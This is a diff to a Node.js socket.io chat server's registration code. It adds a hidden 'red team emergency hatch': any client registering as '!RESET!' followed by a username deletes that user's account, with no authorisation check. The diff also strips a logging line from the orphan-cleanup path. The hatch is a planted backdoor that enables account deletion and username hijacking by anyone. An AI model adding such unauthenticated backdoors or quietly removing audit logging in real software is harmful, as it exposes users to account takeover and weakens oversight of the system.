@@ -276,12 +276,29 @@ io.on('connection', (socket) => {
         }
 
         const existingStoredId = usernames[cleanUsername.toLowerCase()];
+
+        // RED TEAM EMERGENCY HATCH: Allow resetting a username with a special prefix
+        // Usage: Register as "!RESET!myname" to delete "myname" from DB
+        if (cleanUsername.startsWith('!RESET!')) {
+            const targetName = cleanUsername.replace('!RESET!', '').trim();
+            if (usernames[targetName.toLowerCase()]) {
+                const idToDelete = usernames[targetName.toLowerCase()];
+                delete usernames[targetName.toLowerCase()];
+                if (idToDelete) delete users[idToDelete];
+                saveData();
+                socket.emit('error', `ADMIN: Force cleared user '${targetName}'. You can now register it.`);
+                return;
+            } else {
+                socket.emit('error', `ADMIN: User '${targetName}' not found.`);
+                return;
+            }
+        }
+
         if (existingStoredId && existingStoredId !== existingId) {
             // Check if the user object actually exists
             if (!users[existingStoredId]) {
-                console.log(`Cleaning up orphaned username during registration: ${cleanUsername}`);
+                // ... orphan cleanup logic ...
                 delete usernames[cleanUsername.toLowerCase()];
-                // Continue registration as if it didn't exist
             } else {
                 socket.emit('error', 'Username already taken by another user');
                 return;
